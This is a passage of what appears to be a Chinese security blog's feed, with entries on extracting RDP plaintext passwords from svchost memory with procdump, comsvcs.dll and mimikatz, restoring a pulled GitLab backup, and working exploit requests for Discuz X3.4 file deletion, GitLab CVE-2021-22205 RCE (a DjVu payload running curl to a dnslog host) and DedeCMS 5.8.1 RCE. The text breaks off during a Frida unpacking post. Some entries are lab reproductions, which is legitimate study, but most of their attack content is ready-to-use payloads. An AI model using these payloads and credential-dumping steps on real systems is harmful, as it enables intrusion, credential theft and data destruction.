        <content type="html"><![CDATA[<p>我感到有点累了</p><hr><span id="more"></span><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>适用于本地账户和域帐户</li><li>必须是正处于 “活动” 状态的 RDP 会话</li><li>支持 Win8.1 和 Win2012 之后的所有系统</li><li>转储的是 <code>svchost</code> 进程而不是<code>lsass</code></li><li>有时能dump出密码，有时候dump不出来，不知道明文密码会在内存中存在多久</li></ul><h3 id="查找rdp连接"><a href="#查找rdp连接" class="headerlink" title="查找rdp连接"></a>查找rdp连接</h3><p>PowerShell：<code>netstat -nob | Select-String TermService -Context 1</code></p><p><img src="../../../../img/21-12-16/image-20211216212922000.png" alt="Assassins小白"></p><p>存在连接，运行下面这条命令，查找 <code>svchost.exe</code> 进程的 pid</p><p><code>tasklist /M:rdpcorets.dll</code></p><p>将显示加载 <code>rdpcorets</code> dll库的进程</p><p><img src="../../../../img/21-12-16/image-20211216213010343.png" alt="Assassins小白"></p><h3 id="进程转储方式"><a href="#进程转储方式" class="headerlink" title="进程转储方式"></a>进程转储方式</h3><ul><li><p>使用Process Hacker</p></li><li><p>使用任务管理器。右键单击该过程，然后选择 “创建转储文件”</p></li></ul><p><img src="../../../../img/21-12-16/image-20211216213045500.png" alt="Assassins小白"></p><ul><li>使用 Procdump</li></ul><p><code>procdump.exe -ma [PROCESS ID] -accepteula [FILE PATH]</code></p><p><img src="../../../../img/21-12-16/image-20211216213109349.png" alt="Assassins小白"></p><ul><li>使用 <code>comsvc.dll</code>（只在 PowerShell下测试成功）</li></ul><p><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 进程ID 1.dmp full</code></p><p><img src="../../../../img/21-12-16/image-20211216213139180.png" alt="Assassins小白"></p><p>(<code>procdump</code>和<code>comsvcs</code>两种方式dump关键进程都会被杀软拦截)</p><h3 id="翻密码"><a href="#翻密码" class="headerlink" title="翻密码"></a>翻密码</h3><p>进程转储出来后，就需要找到里面的明文密码了</p><ul><li>直接搜用户名没发现密码</li></ul><p><code>strings -el 1.dmp | grep test -C3</code></p><ul><li>直接搜密码发现了(怎么精准定位到密码是个问题)</li></ul><p><code>strings -el 1.dmp | grep BBn12345ee -C3</code></p><p><img src="../../../../img/21-12-16/image-20211216213334782.png" alt="Assassins小白"></p><h3 id="或，直接在目标机器执行mimikatz获取rdp明文密码"><a href="#或，直接在目标机器执行mimikatz获取rdp明文密码" class="headerlink" title="或，直接在目标机器执行mimikatz获取rdp明文密码"></a>或，直接在目标机器执行mimikatz获取rdp明文密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">ts::sessions</span><br><span class="line">ts::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-12-16/image-20211216213354391.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> RDP </tag>
            
            <tag> 提取明文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitlab实战拖备份恢复</title>
      <link href="2021/11/22/Gitlab%E5%AE%9E%E6%88%98%E6%8B%96%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/"/>
      <url>2021/11/22/Gitlab%E5%AE%9E%E6%88%98%E6%8B%96%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>星星睡不着的时候，会不会数人类?</p><hr><span id="more"></span><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>执行命令备份：<code>gitlab-rake gitlab:backup:create</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用以上命令会在  &#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;backups 目录下创建一个名称类似为 1530156812_2018_06_28_10.8.4_gitlab_backup.tar 命名格式的压缩包（默认配置情况下）</span><br></pre></td></tr></table></figure><h3 id="查看Gitlab版本"><a href="#查看Gitlab版本" class="headerlink" title="查看Gitlab版本"></a>查看Gitlab版本</h3><p>查看生成的备份文件名，或者备份文件中的 <code>backup_information.yml</code> 文件可查看目标版本</p><p><img src="../../../../img/21-11-22/1.png" alt="Assassins小白"></p><p>目标使用Gitlab版本为 <code>13.9.1</code></p><h3 id="Docker-Pull相应版本的Gitlab"><a href="#Docker-Pull相应版本的Gitlab" class="headerlink" title="Docker Pull相应版本的Gitlab"></a>Docker Pull相应版本的Gitlab</h3><p>使用docker搭建gitlab来还原数据，方便快捷</p><p><code>docker pull gitlab/gitlab-ce:13.9.1-ce.0</code></p><p>这里下载ce版本的gitlab，之前下载了个ee版本的，还原提示版本不兼容…md</p><p><img src="../../../../img/21-11-22/4.png" alt="Assassins小白"></p><p>下载完成后查看我们的docker镜像</p><p><code>docker images</code></p><p><img src="../../../../img/21-11-22/2.png" alt="Assassins小白"></p><h3 id="运行Docker"><a href="#运行Docker" class="headerlink" title="运行Docker"></a>运行Docker</h3><p><code>docker run -d -p 8080:80 gitlab/gitlab-ee:13.9.1-ce.0</code></p><p><code>-d</code> 后台运行</p><p><code>-p</code> 将docker容器的80端口，映射到物理机的8080端口</p><p>访问8080端口，已经run起来了</p><p><img src="../../../../img/21-11-22/3.png" alt="Assassins小白"></p><h3 id="将拖回来的备份文件拷贝到Docker容器里"><a href="#将拖回来的备份文件拷贝到Docker容器里" class="headerlink" title="将拖回来的备份文件拷贝到Docker容器里"></a>将拖回来的备份文件拷贝到Docker容器里</h3><p><code>docker ps</code>  查找容器id</p><p><code>docker inspect -f &#39;&#123;&#123;.ID&#125;&#125;&#39; 容器id</code>   查找容器长id（或者启动容器的时候使用-d参数，返回的就是这串长id）</p><p><img src="../../../../img/21-11-22/5.png" alt="Assassins小白"></p><p>拷贝本地文件到docker容器</p><p><code>docker cp 本地路径 容器长ID:容器内路径</code></p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp &#x2F;home&#x2F;ubuntu&#x2F;testaaa.tar 356d7201b1fe6f267396958a9c8d3b14bd8a25701efd05efcbc69ee20e37e8b6:&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;backups&#x2F;</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-11-22/6.png" alt="Assassins小白"></p><p>进入容器终端查看</p><p><code>docker exec -it 容器短id /bin/bash</code></p><p>文件已经上传到docker容器内</p><p><img src="../../../../img/21-11-22/7.png" alt="Assassins小白"></p><p>名字修改为标准格式命名</p><p><img src="../../../../img/21-11-22/8.png" alt="Assassins小白"></p><h3 id="Gitlab恢复"><a href="#Gitlab恢复" class="headerlink" title="Gitlab恢复"></a>Gitlab恢复</h3><p>停止相关数据连接服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gitlab-ctl stop unicorn</span><br><span class="line">gitlab-ctl stop sidekiq</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-11-22/9.png" alt="Assassins小白"></p><p>恢复备份，指定要恢复备份文件的时间戳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 比如备份文件是1625016396_2021_06_30_12.0.2_gitlab_backup.tar，那么需要执行下面命令</span><br><span class="line">gitlab-rake gitlab:backup:restore BACKUP&#x3D;1625016396_2021_06_30_12.0.2</span><br></pre></td></tr></table></figure><p>执行，输入yes</p><p><img src="../../../../img/21-11-22/10.png" alt="Assassins小白"></p><p>显示 <code>gitlab.rb</code> 和 <code>gitlab-secrets.json</code> 文件需要手动恢复，还原任务完成</p><p>（有些 <code>gitlab</code> 还原后没有这两个文件会一直显示500，文件在 <code>/etc/gitlab/</code> 目录下）</p><p><img src="../../../../img/21-11-22/11.png" alt="Assassins小白"></p><p>进入 <code>gitlab-rails console</code></p><p><img src="../../../../img/21-11-22/12.png" alt="Assassins小白"></p><p>重置root密码，最少需要八位字符</p><p><code>User.where(username: &#39;root&#39;).first.update! password: &#39;12345678&#39;</code></p><p><img src="../../../../img/21-11-22/13.png" alt="Assassins小白"></p><p>然后就可以使用root账号登录进去了</p><p><img src="../../../../img/21-11-22/14.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Gitlab </tag>
            
            <tag> 拖备份文件 </tag>
            
            <tag> 恢复 </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz!X3.4任意文件删除漏洞复现</title>
      <link href="2021/11/18/Discuz!x3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/11/18/Discuz!x3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>生活葬了童真，物欲脏了灵魂</p><hr><span id="more"></span><p>Vulhub运行报错，因为端口占用了，默认是使用80端口</p><p><img src="../../../../img/21-11-18/1.png" alt="Assassins小白"></p><p>修改目录下的 <code>docker-compose.yml</code> 文件，前面这个端口号修改为其他空闲端口</p><p><img src="../../../../img/21-11-18/2.png" alt="Assassins小白"></p><p><code>docker-compose up -d</code> 运行</p><p><img src="../../../../img/21-11-18/3.png" alt="Assassins小白"></p><p>访问网站</p><p><img src="../../../../img/21-11-18/4.png" alt="Assassins小白"></p><p>将 <code>数据库服务器</code> 修改为 <code>db</code> ，设置好账号密码，下一步</p><p><img src="../../../../img/21-11-18/5.png" alt="Assassins小白"></p><p>安装完成</p><p><img src="../../../../img/21-11-18/6.png" alt="Assassins小白"></p><p>注册一个用户</p><p><img src="../../../../img/21-11-18/7.png" alt="Assassins小白"></p><p>在个人资料页 <code>/home.php?mod=spacecp</code> ，找到自己的 <code>formhash</code> 值 </p><p><img src="../../../../img/21-11-18/8.png" alt="Assassins小白"></p><p>带上自己的 <code>Cookie</code> <code>formhash</code> 值发送如下数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base HTTP&#x2F;1.1</span><br><span class="line">Host: IP&#x2F;域名:端口</span><br><span class="line">Content-Length: 367</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;61.0.3163.79 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6</span><br><span class="line">Cookie: 你账号的cookie</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;formhash&quot;</span><br><span class="line"></span><br><span class="line">你的formhash值</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;birthprovince&quot;</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;robots.txt  # 你要删除的文件名</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;profilesubmit&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s--</span><br></pre></td></tr></table></figure><p>尝试删除 <code>favicon.ico</code> 文件</p><p><img src="../../../../img/21-11-18/9.png" alt="Assassins小白"></p><p>个人资料处的出生地变化 <code>/home.php?mod=spacecp</code>，说明修改成功</p><p><img src="../../../../img/21-11-18/10.png" alt="Assassins小白"></p><p>使用如下POC上传任意一个文件，上传后，文件被删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;你的formhash HTTP&#x2F;1.1</span><br><span class="line">Host: IP&#x2F;域名:端口</span><br><span class="line">Content-Length: 2011679</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarysI786OHcNJPV5eGT</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.69 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: 你账户的cookie</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarysI786OHcNJPV5eGT</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;birthprovince&quot;; filename&#x3D;&quot;Default.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">上传文件内容</span><br><span class="line">------WebKitFormBoundarysI786OHcNJPV5eGT--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-11-18/11.png" alt="Assassins小白"></p><p>文件被删除</p><p><img src="../../../../img/21-11-18/12.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Discuz!x3.4 </tag>
            
            <tag> 任意文件删除 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub复现Gitlab远程命令执行(CVE-2021-22205)</title>
      <link href="2021/11/17/Vulhub%E5%A4%8D%E7%8E%B0Gitlab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2021-22205/"/>
      <url>2021/11/17/Vulhub%E5%A4%8D%E7%8E%B0Gitlab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2021-22205/</url>
      
        <content type="html"><![CDATA[<p>接受自己普通，然后全力以赴出众</p><hr><span id="more"></span><p>Vulhub搭建成功后是502页面，过一会儿页面跳转到 <code>/users/sign_in</code> 页面就恢复正常了</p><h3 id="登录后RCE"><a href="#登录后RCE" class="headerlink" title="登录后RCE"></a>登录后RCE</h3><p>Gitlab主页：</p><p><img src="../../../../img/21-11-17/1.png" alt="Assassins小白"></p><p>使用账号密登录：<code>root</code> / <code>vulhub123456</code></p><p><img src="../../../../img/21-11-17/2.png" alt="Assassins小白"></p><p>新建 <code>Snippets</code></p><p><img src="../../../../img/21-11-17/3.png" alt="Assassins小白"></p><p>点击 <code>Description(optional)</code></p><p><img src="../../../../img/21-11-17/4.png" alt="Assassins小白"></p><p>上传<code>DjVu</code>格式的图片</p><p><img src="../../../../img/21-11-17/5.png" alt="Assassins小白"></p><p>使用工具生成EXP</p><p>在kali上输入 <code>djvumake</code>，没有就选择 <code>y</code> 安装</p><p><img src="../../../../img/21-11-17/6.png" alt="Assassins小白"></p><p>将下面的内容保存到txt里面，命名为 <code>test.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(metadata</span><br><span class="line"> (Copyright &quot;\</span><br><span class="line">&quot; . qx&#123;curl ci35g5.dnslog.cn&#125; . \</span><br><span class="line">&quot; b &quot;) )</span><br></pre></td></tr></table></figure><p>使用下面命令，生成图片</p><p><code>djvumake test.djvu INFO=0,0 BGjp=/dev/null ANTa=test.txt &amp;&amp; mv test.djvu test.jpg</code></p><p><img src="../../../../img/21-11-17/7.png" alt="Assassins小白"></p><p>上传图片后显示失败</p><p><img src="../../../../img/21-11-17/8.png" alt="Assassins小白"></p><p>我们在dnslog平台上面查看，发现其实已经执行了代码</p><p><img src="../../../../img/21-11-17/9.png" alt="Assassins小白"></p><p>后续利用可以直接在burp里面修改需要执行的命令，也可以利用github开源工具一键化利用</p><p><code>python CVE-2021-22205.py -a true -t 目标URL -c &quot;执行的命令&quot;</code></p><p>(vulhub的环境好像有点问题，发现只能执行23位以内的payload，超过就不会执行)</p><p>github开源工具：<a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p><p><img src="../../../../img/21-11-17/10.png" alt="Assassins小白"></p><h3 id="未授权RCE"><a href="#未授权RCE" class="headerlink" title="未授权RCE"></a>未授权RCE</h3><p>有些Gitlab没开放注册，这时候可以尝试未授权漏洞</p><p>使用如下POC获取Cookie和csrf-token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;users&#x2F;sign_in HTTP&#x2F;1.1</span><br><span class="line">Host: IP:端口</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko&#x2F;20100101 Firefox&#x2F;93.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记录Cookie</p><p><img src="../../../../img/21-11-17/11.png" alt="Assassins小白"></p><p>记录Csrf-Token</p><p><img src="../../../../img/21-11-17/12.png" alt="Assassins小白"></p><p>获取到的值放到下面这个POC中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;uploads&#x2F;user HTTP&#x2F;1.1</span><br><span class="line">Host: IP:端口</span><br><span class="line">Content-Length: 297</span><br><span class="line">X-CSRF-Token: 这里填写csrf-token</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.69 Safari&#x2F;537.36</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryiCE9XEN5Gezm2Wtv</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: experimentation_subject_id&#x3D;这里填写cookie;_gitlab_session&#x3D;这里填写cookie</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryiCE9XEN5Gezm2Wtv</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">(metadata</span><br><span class="line"> (Copyright &quot;\</span><br><span class="line">&quot; . qx&#123;curl ci35g5.dnslog.cn&#125; . \</span><br><span class="line">&quot; b &quot;) )</span><br><span class="line">------WebKitFormBoundaryiCE9XEN5Gezm2Wtv--</span><br></pre></td></tr></table></figure><p>然后发包</p><p><img src="../../../../img/21-11-17/13.png" alt="Assassins小白"></p><p>命令执行成功</p><p><img src="../../../../img/21-11-17/14.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> vulhub </tag>
            
            <tag> Gitlab </tag>
            
            <tag> CVE-2021-22205 </tag>
            
            <tag> 未授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单开弹子锁</title>
      <link href="2021/11/07/%E7%AE%80%E5%8D%95%E5%BC%80%E5%BC%B9%E5%AD%90%E9%94%81/"/>
      <url>2021/11/07/%E7%AE%80%E5%8D%95%E5%BC%80%E5%BC%B9%E5%AD%90%E9%94%81/</url>
      
        <content type="html"><![CDATA[<p>将喜欢的一切留在身边，这便是努力的意义</p><hr><span id="more"></span><h4 id="首先感谢ASRC送的锁"><a href="#首先感谢ASRC送的锁" class="headerlink" title="首先感谢ASRC送的锁"></a>首先感谢ASRC送的锁</h4><p><img src="../../../../img/21-11-07/1.jpg" alt="Assassins小白"></p><h4 id="拿到快递后二十分钟"><a href="#拿到快递后二十分钟" class="headerlink" title="拿到快递后二十分钟"></a>拿到快递后二十分钟</h4><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="../../../../img/21-11-07/4692c449ad4e72dff72b393d79fabcb1.mp4" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><h4 id="拿到快递后一个小时，Easy！"><a href="#拿到快递后一个小时，Easy！" class="headerlink" title="拿到快递后一个小时，Easy！"></a>拿到快递后一个小时，Easy！</h4><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="../../../../img/21-11-07/f455a9199059696655ef952141660413.mp4" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div>]]></content>
      
      
      
        <tags>
            
            <tag> 开锁 </tag>
            
            <tag> 弹子锁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DeDedeCMS v5.8.1 beta 1 内测版前台无条件RCE</title>
      <link href="2021/10/01/DeDedeCMS-v5-8-1-beta-1-%E5%86%85%E6%B5%8B%E7%89%88%E5%89%8D%E5%8F%B0%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/"/>
      <url>2021/10/01/DeDedeCMS-v5-8-1-beta-1-%E5%86%85%E6%B5%8B%E7%89%88%E5%89%8D%E5%8F%B0%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/</url>
      
        <content type="html"><![CDATA[<p>风停在窗边嘱咐你要热爱这个世界</p><hr><span id="more"></span><p>原文地址：<a href="https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html">https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/dedecms/DedeCMS/releases/tag/v5.8.1">https://github.com/dedecms/DedeCMS/releases/tag/v5.8.1</a></p><p><img src="../../../../img/21-10.01/1.png" alt="Assassins小白"></p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>使用 <code>phpstudy</code> ，修改PHP版本为7以上</p><p><img src="../../../../img/21-10.01/2.png" alt="Assassins小白"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><strong>Exp:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;plus&#x2F;flink.php?dopost&#x3D;save&amp;c&#x3D;dir HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.6</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.61 Safari&#x2F;537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: &lt;?php &quot;system&quot;($c);die;&#x2F;*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;ru71gg8tjg0f8404rkac6iibid</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><strong>dir</strong></p><p><img src="../../../../img/21-10.01/3.png" alt="Assassins小白"></p><p><strong>whoami</strong></p><p><img src="../../../../img/21-10.01/4.png" alt="Assassins小白"></p><p><strong>其他路径：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;plus&#x2F;flink.php?dopost&#x3D;save</span><br><span class="line">&#x2F;plus&#x2F;users_products.php?oid&#x3D;1337</span><br><span class="line">&#x2F;plus&#x2F;download.php?aid&#x3D;1337</span><br><span class="line">&#x2F;plus&#x2F;showphoto.php?aid&#x3D;1337</span><br><span class="line">&#x2F;plus&#x2F;users-do.php?fmdo&#x3D;sendMail</span><br><span class="line">&#x2F;plus&#x2F;posttocar.php?id&#x3D;1337</span><br><span class="line">&#x2F;plus&#x2F;vote.php?dopost&#x3D;view</span><br><span class="line">&#x2F;plus&#x2F;carbuyaction.php?do&#x3D;clickout</span><br><span class="line">&#x2F;plus&#x2F;recommend.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DeDeCMS </tag>
            
            <tag> 前台 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Frida+FRIDA-DEXDump脱360壳</title>
      <link href="2021/09/29/%E4%BD%BF%E7%94%A8Frida+FRIDA-DEXDump%E8%84%B1360%E5%A3%B3/"/>
      <url>2021/09/29/%E4%BD%BF%E7%94%A8Frida+FRIDA-DEXDump%E8%84%B1360%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<p>这孤单的滋味，我慢慢体会</p><hr><span id="more"></span><p>我使用的python版本是3.9</p><p>pip安装模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><p>不翻墙的话安装会比较慢，可以使用离线安装方式</p><p>直接安装 <code>frida-tools</code> 模块，默认自动会安装 <code>frida</code> 模块</p><p>安装好后，在系统 <code>cmd</code> 执行 <code>frida --version</code> 命令，如果有版本信息就是安装成功了</p><p>如果出现报错，或者是 <code>failed to create process</code> ，如下</p><p>打开 <code>python</code> 路径下的 <code>scripts</code> 文件夹，找到 <code>frida-script.py</code> 文件</p><p><img src="../../../../img/21-09-29/1.png" alt="Assassins小白"></p><p>直接将第一行删除（因为我们的用户名是中文，乱码导致报错）</p><p><img src="../../../../img/21-09-29/2.png" alt="Assassins小白"></p><p>删除后运行正常</p><p><img src="../../../../img/21-09-29/3.png" alt="Assassins小白"></p><p>然后下载 <code>ADB</code> 工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 